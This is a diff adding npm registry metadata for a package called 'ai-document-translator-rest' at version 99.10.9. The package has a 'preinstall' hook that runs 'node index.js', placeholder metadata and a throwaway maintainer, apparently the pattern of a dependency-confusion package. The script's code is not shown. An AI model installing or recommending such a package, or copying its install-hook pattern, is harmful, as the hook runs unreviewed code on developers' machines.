@@ -1,0 +1,62 @@
+{
+    "_id": "ai-document-translator-rest",
+    "name": "ai-document-translator-rest",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "ai-document-translator-rest",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "ai-document-translator-rest@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-DgDzO72NCixRsOPmJ6dCbtmExNcAY36vZwMCbSBowR9vhHMiInYPu7Rep99p4xZuXu6JroWAvYgZk7DhQtUxmA==",
+                "shasum": "d7f9f1deba1625ae22c36884aa8a95f02062147c",
+                "tarball": "https://registry.npmjs.org/ai-document-translator-rest/-/ai-document-translator-rest-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5079,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPITFACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqFyBAAkePV8wXpkXYBwK9ZKSYiFkCMZCT8qAeurx/ixGO4yDQQZWnq\r\nzeB5vXUuz3WadLeOpPiDxa6KQ8o3ZtgLfX/RgNmoNlsyUqCv7gA09nV5YfUR\r\n6hFEzE8W2YraIuXG5Hg5Dwp8n+YZ+KLH4lWeqk6Y6ScHOwj5qEzbmBjfsxkr\r\nvZjA9SvTPjpTs5WlmRUb5vP2jxLqzdM9apUBEj3JVcOHeYzDgvfOq6Ve6SqZ\r\nY0HTIAcrQXE5WZGudLVuZhFGsjEqkepOATV5OeMz7PnA+9Pgz/c/2say9Vt/\r\nNygeVAsnoTw+GDP6sBXoE8+OzrsJqA3+PavI2K6bSBmaj5VaFkL9zL9FKazi\r\nBsvd2yP34PNocS1qIJSTPjscq1OhdxEYNluYUpUtIPHogKj4p/ZWxl8LxeDS\r\naciZdjNbpRYcu2xKByJXZF8jep6Pbfi5Gd4VO9P7gvlnhuqYuBmO83f1TsR+\r\nNSa7miPRGytzFVpAJYsHKISOYZJymegZdJbn12pFng95SM1TCPVGTB4WSZ+8\r\nLuNh3SzmL2ATz/uMnsZzgWqaV4TW5GJFpV9jbd5FdV1NcIFR+tAYonyJxGzR\r\nRRlY9mEn4rxrE3RCA4+Sl3uavicion6wwq0Iy0Vjgh3TI8GXTBLxxsQYlp2P\r\namcw1v+Lnyt7amGhlwSSUgX/uPUrVmXP8LM=\r\n=dt4q\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "x5ea7169",
+                "email": "x5ea7169@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "x5ea7169",
+                    "email": "x5ea7169@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/ai-document-translator-rest_99.10.9_1648133317533_0.010797128542238132"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T14:48:37.533Z",
+        "99.10.9": "2022-03-24T14:48:37.699Z",
+        "modified": "2022-03-24T14:48:37.823Z"
+    },
+    "maintainers": [
+        {
+            "name": "x5ea7169",
+            "email": "x5ea7169@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
